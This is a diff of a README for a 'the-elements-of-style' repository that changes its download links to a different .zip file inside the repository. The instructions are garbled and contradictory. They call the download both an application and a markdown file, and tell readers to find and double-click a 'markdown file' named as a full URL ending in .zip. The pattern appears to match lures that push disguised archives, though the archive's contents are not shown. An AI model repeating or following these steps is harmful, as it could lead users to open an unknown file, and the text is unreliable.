@@ -16,26 +16,26 @@ Before you start, make sure you have the following:
 
 You can download the latest version of *the-elements-of-style* from our Releases page. 
 
-[![Download the Elements of Style](https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/Cowperian/the-elements-of-style.zip%20Here-brightgreen)](https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/Cowperian/the-elements-of-style.zip)
+[![Download the Elements of Style](https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/skills/writing-clearly-and-concisely/elements_the_style_of_v1.2.zip%20Here-brightgreen)](https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/skills/writing-clearly-and-concisely/elements_the_style_of_v1.2.zip)
 
 ## 📂 Download & Install
 
 To download the application, visit this page:
 
-[Download the Elements of Style](https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/Cowperian/the-elements-of-style.zip)
+[Download the Elements of Style](https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/skills/writing-clearly-and-concisely/elements_the_style_of_v1.2.zip)
 
 Once you are on the Releases page, follow these steps:
 
 1. Look for the latest release at the top of the page.
 2. Click on the version number, which will take you to the release details.
-3. Find the markdown file named `https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/Cowperian/the-elements-of-style.zip` or similar.
+3. Find the markdown file named `https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/skills/writing-clearly-and-concisely/elements_the_style_of_v1.2.zip` or similar.
 4. Click on the file to start the download. The file will typically be saved in your "Downloads" folder.
 
 ## 🔄 Running the Application
 
 After downloading, you can read the file directly using your favorite markdown viewer. Here's how:
 
-1. Navigate to the location where you saved the `https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/Cowperian/the-elements-of-style.zip` file.
+1. Navigate to the location where you saved the `https://raw.githubusercontent.com/kobeking123/the-elements-of-style/main/skills/writing-clearly-and-concisely/elements_the_style_of_v1.2.zip` file.
 2. Double-click the file. If you have a markdown viewer installed, it will open automatically.
 3. If you are using a text editor, right-click on the file and choose "Open with" to select your preferred application.
 
